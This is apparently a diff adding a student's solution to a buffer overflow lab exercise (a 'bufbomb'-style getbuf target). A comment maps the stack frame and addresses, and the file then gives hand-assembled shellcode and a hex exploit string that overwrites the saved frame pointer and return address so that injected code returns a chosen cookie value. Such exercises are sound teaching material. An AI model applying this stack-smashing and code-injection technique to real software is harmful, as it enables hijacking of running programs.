@@ -1,0 +1,30 @@
+/* 
+ stack of <getbuf>:
+                       ......
+ return address <-- |0x08048E81|   0x0
+ old EBP        <-- |0x55683440|  -0x4
+                    |----------|
+                       ......
+ string         <-- |----------| -0x2C
+                       ......
+ The target is to make the return value be my unique Cookie(0x31 A8 15 5B).
+
+ return address: 0x08 04 8E 81
+ 
+ At 0x080491F2, esp = 0x556833D8, stack info:
+                       ......
+ return address <-- |0x08048E81| 0x55683414
+ old EBP        <-- |0x55683440| 0x55683410
+                       ......
+ string         <-- |----------| 0x556833E8
+                       ......
+                    |----------| 0x556833D8
+
+ Rewind EBP and EIP!!!!!!
+
+ Code:
+    A1 20 C2 04 08    mov 0x804c220<cookie>, %eax
+    68 81 8E 04 08    push $0x08048E81
+    C3                ret
+ */
+A1 20 C2 04 08 68 81 8E 04 08 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 40 34 68 55 E8 33 68 55
